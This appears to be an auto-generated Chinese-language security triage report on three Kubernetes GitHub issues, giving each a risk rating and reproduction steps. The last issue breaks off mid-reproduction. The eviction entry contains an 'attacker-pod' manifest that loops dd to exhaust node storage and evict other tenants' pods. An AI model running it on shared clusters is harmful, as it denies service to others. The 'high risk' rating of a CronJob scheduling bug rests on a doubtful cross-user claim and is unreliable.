# Issue 安全分析报告

# 🚨 存在高风险的 Issues (8 个)

## Issue #128155 Unexpected Job Creation After CronJob Schedule Update

- Issue 链接：[#128155](https://github.com/kubernetes/kubernetes/issues/128155)

### Issue 内容

#### What happened?

I have a CronJob running on an EKS cluster (1.28) with an initial schedule of `40 23 * * *`.
1. At `23:40 UTC`, a job was successfully completed, taking few seconds. 
2. At around `23:55 UTC`,  I changed the CronJob schedule to `50 23 * * *`. 
3. At `03:31:03 UTC`, an unexpected job was created.

I was able to reproduce the issue on another EKS cluster (1.28). Since I can't increase the verbosity level in EKS to gather more detailed logs from the controller manager, I decided to reproduce the issue on a local cluster created via Kind. I managed to reproduce the problem on both 1.28 and 1.31.

When testing on local cluster(1.28), I discovered a more interesting scenario. I had two CronJobs `cronjob-test-2` and `cronjob-test-3`
- cronjob-test-2: `49 9 * * *` -> `51 9 * * *`, with the change occurring shortly after `9:51 UTC`
- cronjob-test-3: `35 4 * * *` -> `38 4 * * *`, with the change occurring shortly after `4:38 UTC`

Surprisingly, both CronJobs created an unexpected job at the same time, `22:50:22 UTC`. Additionally, `cronjob-test-2` even missed an expected job
```
NAME                      COMPLETIONS   DURATION   AGE
cronjob-test-2-28816429   1/1           8s         38h    # a job was missed after this one
cronjob-test-2-28817871   1/1           6s         110m   # 22:50:22 UTC
cronjob-test-3-28817555   1/1           5s         20h
cronjob-test-3-28817558   1/1           4s         110m   # 22:50:22 UTC
``` 
<details>
  <summary>Cronjob Controller Logs</summary>
Following is the logs from cronjob_controllerv2 and job_controller, and the verbosity was set as 4.

```
I1015 09:45:19.354428       1 job_controller.go:226] "Starting job controller"
I1015 09:45:19.507521       1 cronjob_controllerv2.go:139] "Starting cronjob controller v2"
I1015 09:47:47.961434       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1015 09:47:47.961466       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="1m12.13858604s"
I1015 09:49:00.115477       1 cronjob_controllerv2.go:633] "Created Job" job="default/cronjob-test-2-28816429" cronjob="default/cronjob-test-2"
I1015 09:49:00.115531       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:00.115632       1 job_controller.go:1545] "Too few pods running" key="default/cronjob-test-2-28816429" need=1 creating=1
I1015 09:49:00.119191       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="23h59m59.999440367s"
I1015 09:49:00.119243       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1015 09:49:00.119255       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="23h59m59.980770867s"
I1015 09:49:00.122067       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:00.123710       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:00.124323       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:00.124356       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28816429" elapsed="8.80725ms"
I1015 09:49:00.124368       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1015 09:49:00.124392       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="23h59m59.975645909s"
I1015 09:49:00.127551       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:01.122770       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28816429" elapsed="373.625µs"
I1015 09:49:06.780723       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:07.781300       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28816429" elapsed="113.042µs"
I1015 09:49:07.843924       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:08.784246       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:08.849759       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:08.849794       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1015 09:49:08.849808       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="23h59m51.250220655s"
I1015 09:49:08.852371       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:08.854308       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28816429" elapsed="9.805583ms"
I1015 09:49:08.854309       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:08.854353       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1015 09:49:08.856452       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="23h59m51.245670446s"
I1015 09:49:08.856481       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1015 09:49:08.858155       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="23h59m51.243529696s"
I1015 09:49:08.858215       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1015 09:49:08.858229       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="23h59m51.241795738s"
I1015 09:49:09.850763       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28816429" elapsed="88.25µs"
I1016 04:33:45.800541       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:33:45.800579       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="1m14.299487083s"
I1016 04:35:00.107918       1 cronjob_controllerv2.go:633] "Created Job" job="default/cronjob-test-3-28817555" cronjob="default/cronjob-test-3"
I1016 04:35:00.108011       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:00.108159       1 job_controller.go:1545] "Too few pods running" key="default/cronjob-test-3-28817555" need=1 creating=1
I1016 04:35:00.109944       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m59.999111701s"
I1016 04:35:00.109981       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:35:00.109991       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m59.990031618s"
I1016 04:35:00.110014       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:35:00.110039       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m59.989994201s"
I1016 04:35:00.113206       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:00.115032       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:00.115046       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817555" elapsed="7.007833ms"
I1016 04:35:00.115074       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:35:00.115103       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m59.984938868s"
I1016 04:35:00.115152       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:00.118528       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:01.115214       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817555" elapsed="191.917µs"
I1016 04:35:03.142287       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:04.142862       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817555" elapsed="230.125µs"
I1016 04:35:04.210513       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:05.149604       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:05.218654       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:05.218724       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:35:05.218770       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m54.881306115s"
I1016 04:35:05.221914       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:05.223483       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:05.223533       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817555" elapsed="11.988792ms"
I1016 04:35:05.223535       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:35:05.225526       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m54.876482823s"
I1016 04:35:05.225572       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:35:05.227006       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m54.874438157s"
I1016 04:35:05.227037       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:35:05.227051       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m54.87297224s"
I1016 04:35:06.220824       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817555" elapsed="90.458µs"
I1016 22:50:22.080092       1 cronjob_controllerv2.go:633] "Created Job" job="default/cronjob-test-3-28817558" cronjob="default/cronjob-test-3"
I1016 22:50:22.080204       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:22.080190       1 cronjob_controllerv2.go:633] "Created Job" job="default/cronjob-test-2-28817871" cronjob="default/cronjob-test-2"
I1016 22:50:22.080302       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:22.080310       1 job_controller.go:1545] "Too few pods running" key="default/cronjob-test-3-28817558" need=1 creating=1
I1016 22:50:22.080342       1 job_controller.go:1545] "Too few pods running" key="default/cronjob-test-2-28817871" need=1 creating=1
I1016 22:50:22.082913       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="5h47m38.030291112s"
I1016 22:50:22.082947       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 22:50:22.082983       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="5h47m38.017065028s"
I1016 22:50:22.083007       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="11h0m38.030373028s"
I1016 22:50:22.083050       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1016 22:50:22.083069       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="11h0m38.016961653s"
I1016 22:50:22.086221       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:22.086290       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:22.087934       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:22.087979       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 22:50:22.088001       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="5h47m38.012036153s"
I1016 22:50:22.088076       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817558" elapsed="7.858958ms"
I1016 22:50:22.088471       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:22.088499       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1016 22:50:22.088512       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="11h0m38.011512362s"
I1016 22:50:22.088654       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28817871" elapsed="8.343708ms"
I1016 22:50:22.088727       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:22.088770       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:22.092991       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:22.095171       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:23.087955       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817558" elapsed="118.291µs"
I1016 22:50:23.087976       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28817871" elapsed="154.625µs"
I1016 22:50:24.887122       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:25.888042       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817558" elapsed="201.375µs"
I1016 22:50:25.929334       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:26.891926       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:26.894910       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:26.932416       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:26.932463       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 22:50:26.932503       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="5h47m33.167550999s"
I1016 22:50:26.934834       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:26.936763       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:26.936769       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817558" elapsed="6.805541ms"
I1016 22:50:26.936798       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 22:50:26.938716       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="5h47m33.163216499s"
I1016 22:50:26.938804       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 22:50:26.940126       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="5h47m33.161207957s"
I1016 22:50:26.940153       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 22:50:26.940166       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="5h47m33.15985679s"
I1016 22:50:27.895393       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28817871" elapsed="355.792µs"
I1016 22:50:27.932640       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817558" elapsed="31.875µs"
I1016 22:50:27.958622       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:28.906520       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:28.963964       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:28.964008       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1016 22:50:28.964022       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="11h0m31.136008123s"
I1016 22:50:28.966974       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:28.968936       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28817871" elapsed="9.14725ms"
I1016 22:50:28.968962       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:28.968997       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1016 22:50:28.972178       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="11h0m31.131016956s"
I1016 22:50:28.972209       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1016 22:50:28.973757       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="11h0m31.127801331s"
I1016 22:50:28.973821       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1016 22:50:28.973837       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="11h0m31.126191373s"
I1016 22:50:29.964871       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28817871" elapsed="122.875µs"
```
</details>

#### What did you expect to happen?

I expected the CronJobs to execute only according to the updated schedules and not trigger any additional or unscheduled jobs.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a CronJob with the schedule to run at time `A` every day. 
2. Allow the job to complete at time `A`.
2. At a later time `C`, update the schedule to `B`. `A < B < C`, `A` is the earliest time. 
3. Wait for several hours. Based on my tests, an unexpected job will be triggered, sometimes even more than 24 hours after `C`.  When this happens after 24 hours, the expected job that should be created at time `C` on the next day is replaced by the unexpected one.

```
kubectl create cronjob cronjob-test --image=busybox --schedule="A.minute A.hour * * *" -- date

# wait until job created at time A, run it at time C
kubectl patch cronjob cronjob-test -p '{"spec": {"schedule": "B.minute B.hour * * *"}}'
```

Unfortunately, I haven't been able to narrow down the creation time of the unexpected job, but this sequence reliably reproduces the issue.

#### Anything else we need to know?

Timezone: 
```
cat /etc/localtime
TZif2UTCTZif2UTC
UTC0
```

Based on my observation:
- **All the unexpected jobs were triggered at the exact same time**
For example, I had three CronJobs with different schedules. After rescheduling them to a later time, a few hours later, the controller manager created all three unexpected jobs simultaneously, even though neither the original nor the new schedules of these CronJobs were the same.
- **The issue only occurs when the reschedule creates an unmet job schedule.** For example, updating from `49 9 * * *` to `48 9 * * *` works fine, but doing the reverse (moving from an earlier to a later time) causes the problem.

This is similar to the issue mentioned [here](https://github.com/kubernetes/kubernetes/issues/123220#), though in my case, the unexpected jobs can be created either on the same day or the next day.

A big thanks to @soltysh  for helping me troubleshoot this issue.


#### Kubernetes version

<details>

I managed to reproduce the same issue across three Kubernetes clusters with the following versions

```
eks: v1.28.13-eks-a737599
kind: v1.28.12 and v1.31.0
```

</details>


#### Cloud provider

<details>
EKS and Kind on local macOS
</details>


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
该Issue描述了在更新CronJob的计划时间后，可能会在预期之外的时间创建并运行Job。而且，当存在多个CronJob时，修改一个CronJob的计划时间后，其他CronJob也可能会在同一时间创建未预期的Job。

在多用户场景下，如果一个低权限用户修改了自己的CronJob计划，可能会导致其他用户的CronJob在非预期时间执行，从而影响其他用户的任务运行。这符合第9条：如果Issue可以发生在多用户场景中，一个低权限用户能够影响和自己权限一样甚至更高的其他用户，如在自身容器中执行命令而影响到他人容器，则应判断为高风险。

因此，该问题可能导致低权限用户影响其他用户的任务执行，属于高安全风险。

**复现过程：**

```json
[
  {
    "cmd": "kubectl create cronjob cronjob-test-1 --image=busybox --schedule=\"40 9 * * *\" -- date",
    "explain": "创建一个名为cronjob-test-1的CronJob，计划在每日9:40执行。"
  },
  {
    "cmd": "kubectl create cronjob cronjob-test-2 --image=busybox --schedule=\"50 9 * * *\" -- date",
    "explain": "创建另一个名为cronjob-test-2的CronJob，计划在每日9:50执行。"
  },
  {
    "cmd": "kubectl get jobs --watch",
    "explain": "实时监控Job的创建和执行状态，等待CronJob在预定时间运行并完成。"
  },
  {
    "cmd": "kubectl patch cronjob cronjob-test-1 -p '{\"spec\": {\"schedule\": \"55 9 * * *\"}}'",
    "explain": "在9:55之前，将cronjob-test-1的计划修改为每日9:55执行。"
  },
  {
    "cmd": "kubectl patch cronjob cronjob-test-2 -p '{\"spec\": {\"schedule\": \"5 10 * * *\"}}'",
    "explain": "将cronjob-test-2的计划修改为每日10:05执行。"
  },
  {
    "cmd": "kubectl get jobs --watch",
    "explain": "继续监控，等待数小时，观察是否有意外的Job被创建。"
  },
  {
    "cmd": "kubectl get jobs",
    "explain": "查看当前的Job列表，检查是否有意外的Job被创建。"
  }
]
```

---

## Issue #128103 Pod status not getting updated to Failed when pod is hard-evicted by Kubelet

- Issue 链接：[#128103](https://github.com/kubernetes/kubernetes/issues/128103)

### Issue 内容

#### What happened?

We have some pods that have a termination grace period of 3600sec. When such a pod gets evicted by the kubelet due to ephemeral storage shortage, the sequence of steps that we expect would happen is:

1. kubelet updates pod status to `Failed`
2. kubelet instructs container runtime to terminate containers without any grace period
3. a `DELETE` for that pod is issued to the apiserver

However, we don't see (1) happen. The pod status remains `Running` until step (3). This issue is further exacerbated by the fact that our version of kube is afflicted by #115819 wherein the termination grace-period of containers is respected, even though it isn't supposed to be.

As a result of this, what ends up happening is:
1. The pod's containers get `SIGTERM` (pod status remains `Running`)
2. Containers take 3600s to shutdown
3. Pod gets deleted from apiserver

This means there is a 1hr window where the pod is available as an 'endpoint' even though the containers have received SIGTERM (and are no longer accepting new connections) until the pod is deleted from the apiserver.

---

Events from the pod when it gets evicted:
```
 Warning  Evicted              3m24s                  kubelet               The node was low on resource: ephemeral-storage. Threshold quantity: 15405210648, available: 14857028Ki. Container appconfd was using 1224Ki, request is 0, has larger consumption of ephemeral-storage. Container istio-proxy was using 104Ki, request is 0, has larger consumption of ephemeral-storage. Container otel-agent was using 1200Ki, request is 0, has larger consumption of ephemeral-storage. Container vector-agent was using 16768Ki, request is 0, has larger consumption of ephemeral-storage. Container vault-refresh was using 1192Ki, request is 0, has larger consumption of ephemeral-storage. Container ses was using 3524Ki, request is 0, has larger consumption of ephemeral-storage. Container logrotate was using 1232Ki, request is 0, has larger consumption of ephemeral-storage. Container vaultpkid-refresh was using 1224Ki, request is 0, has larger consumption of ephemeral-storage.
  Warning  ExceededGracePeriod  3m14s (x9 over 9m18s)  kubelet               Container runtime did not kill the pod within specified grace period.
```

Pod's status is still 'Running':
```
$ k get pod ses-8576fbb5f-2z4jj -o json | jq .status.phase
"Running"
```

#### What did you expect to happen?

In case of a kubelet-initiated eviction, pod status should be updated to `Failed` before containers are terminated.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Configure and run a pod with terminationGracePeriod of 3600s
2. Exec into another pod on the node and write a lot of data to an `emptyDir` until the node runs out of ephemeral storage and evicts pod from step (1)
3. Observe that the status of the pod still displays 'Running' and the pod's IP address is still listed in endpoints.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"24", GitVersion:"v1.24.15", GitCommit:"2c67202dc0bb96a7a837cbfb8d72e1f34dfc2808", GitTreeState:"clean", BuildDate:"2023-06-14T09:56:11Z", GoVersion:"go1.19.10", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v4.5.4
Server Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.16-gke.1148000", GitCommit:"0bb6bb602fbe44baf68389e21f6e11859d08ee2d", GitTreeState:"clean", BuildDate:"2024-08-07T09:16:13Z", GoVersion:"go1.22.5 X:boringcrypto", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>
```
$ cat /etc/os-release
NAME="Container-Optimized OS"
ID=cos
PRETTY_NAME="Container-Optimized OS from Google"
HOME_URL="https://cloud.google.com/container-optimized-os/docs"
BUG_REPORT_URL="https://cloud.google.com/container-optimized-os/docs/resources/support-policy#contact_us"
KERNEL_COMMIT_ID=2890fc8995cd68013377c0adcc1f6e985ee6e11e
GOOGLE_CRASH_ID=Lakitu
GOOGLE_METRICS_PRODUCT_ID=26
VERSION=105
VERSION_ID=105
BUILD_ID=17412.370.78
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
Containerd v1.7.19
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
### 分析

该Issue描述了在Kubernetes集群中，当Pod由于节点临时存储(ephemeral storage)不足而被Kubelet强制驱逐时，Pod的状态不会立即更新为`Failed`，并且由于存在已知问题(#115819)，容器会遵循过长的终止宽限期(terminationGracePeriodSeconds)，导致容器在收到`SIGTERM`信号后，仍需等待长达3600秒才会真正终止。在此期间，Pod的状态仍显示为`Running`，并继续作为服务的端点。

这一行为可能导致以下安全风险：

1. **拒绝服务(DoS)攻击**：攻击者可以在其有权限的Pod中消耗大量的临时存储，导致所在节点的临时存储耗尽，从而触发Kubelet驱逐其他用户的Pod。这些被驱逐的Pod由于上述问题，会在长时间内保持`Running`状态，但实际上无法提供正常服务，导致请求无法得到处理，影响服务可用性。

2. **多租户隔离风险**：在多用户或多租户场景下，低权限用户可以通过消耗节点资源影响其他用户的Pod，违反了租户隔离原则。

根据风险判断标准：

- **标准1**：攻击者可以利用该行为，通过在自身Pod中消耗节点资源，影响其他用户的Pod。
- **标准2**：该风险可能成为一个漏洞，造成拒绝服务，符合CVSS 3.1高危评级的条件。
- **标准9**：在多用户场景中，低权限用户能够影响和自己权限一样甚至更高的其他用户，应判断为高风险。

综上所述，该Issue存在高安全风险。

**复现过程：**

```json
[
  {
    "cmd": "cat <<EOF > vulnerable-pod.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: vulnerable-pod\nspec:\n  terminationGracePeriodSeconds: 3600\n  containers:\n  - name: vulnerable-container\n    image: nginx\nEOF",
    "explain": "创建一个具有3600秒终止宽限期的Pod的配置文件。"
  },
  {
    "cmd": "kubectl apply -f vulnerable-pod.yaml",
    "explain": "部署具有长终止宽限期的Pod。"
  },
  {
    "cmd": "cat <<EOF > attacker-pod.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: attacker-pod\nspec:\n  containers:\n  - name: attacker-container\n    image: alpine\n    command: [\"/bin/sh\", \"-c\", \"while true; do dd if=/dev/zero of=/tmp/fill.txt bs=10M count=1024; done\"]\n    volumeMounts:\n    - name: temp-storage\n      mountPath: /tmp\n  volumes:\n  - name: temp-storage\n    emptyDir: {}\nEOF",
    "explain": "创建一个持续写入数据以消耗临时存储的攻击者Pod的配置文件。"
  },
  {
    "cmd": "kubectl apply -f attacker-pod.yaml",
    "explain": "部署攻击者Pod以开始消耗节点的临时存储资源。"
  },
  {
    "cmd": "kubectl get pods",
    "explain": "查看当前所有Pod的状态，观察vulnerable-pod的状态是否保持为Running。"
  },
  {
    "cmd": "kubectl describe pod vulnerable-pod",
    "explain": "查看vulnerable-pod的详细信息，确认其状态和事件日志。"
  },
  {
    "cmd": "kubectl get endpoints",
    "explain": "检查vulnerable-pod是否仍然在服务端点列表中。"
  }
]
```

---

## Issue #128059 iscsi/fc volume with multipath can be incorrectly resolved to partition

- Issue 链接：[#128059](https://github.com/kubernetes/kubernetes/issues/128059)

### Issue 内容

#### What happened?

If worker nodes are configured so that multipath symlink under `/dev/disk/by-id` points directly to device mapper device (dm-X) the FC/iSCSI volume plugin code in Kubernetes can not handle this well and finds incorrect device.

This is because `FindMultipathDeviceForDevice` function can be called with already resolved symlink and still tries to resolve it further to find its parent - this can resolve in matching a partition of the device, see details below.


If we have a multipath device `scsi-36001405f3392bf76369422cbfd8acd80` pointing to `dm-2`:

```
ls -l /dev/disk/by-id/scsi-36001405f3392bf76369422cbfd8acd80
lrwxrwxrwx. 1 root root 10 Oct 14 14:43 /dev/disk/by-id/scsi-36001405f3392bf76369422cbfd8acd80 -> ../../dm-2
```

This function will try to lookup it's parent, finding `dm-3`:
```
# ls -la /sys/block/dm-3/slaves
total 0
drwxr-xr-x. 2 root root 0 Oct 14 16:29 .
drwxr-xr-x. 9 root root 0 Oct 14 14:43 ..
lrwxrwxrwx. 1 root root 0 Oct 14 14:44 dm-2 -> ../../dm-2
```

Which is actually a partition of the device:
```
# ls -l /dev/disk/by-id/dm-uuid-part1-mpath-36001405f3392bf76369422cbfd8acd80
lrwxrwxrwx. 1 root root 10 Oct 14 14:43 /dev/disk/by-id/dm-uuid-part1-mpath-36001405f3392bf76369422cbfd8acd80 -> ../../dm-3
```

Multipath and partitions configured:
```
# lsblk
NAME              MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINTS
sda                 8:0    0    50M  0 disk
└─mpathh          253:2    0    50M  0 mpath
  └─mpathh1       253:3    0    10M  0 part
sdb                 8:16   0    50M  0 disk
└─mpathh          253:2    0    50M  0 mpath
  └─mpathh1       253:3    0    10M  0 part
  ...
```

Pod has mounted/attached `253:3` device which is the partition:
```
# crictl inspect 7d8b037b74949 | grep -A3 /dev/data
            "path": "/dev/data",
            "type": "b",
            "major": 253,
            "minor": 3,
```

#### What did you expect to happen?

Should match multipath device instead:

```
# crictl inspect e003f05e7f406 | grep -A 3 /dev/data
            "path": "/dev/data",
            "type": "b",
            "major": 253,
            "minor": 2,
# lsblk| grep "253:2"
└─mpathh          253:2    0    50M  0 mpath
└─mpathh          253:2    0    50M  0 mpath
```


#### How can we reproduce it (as minimally and precisely as possible)?

Locally with `local-up-cluster.sh`, attaching "fake" loopback device as iSCSI:

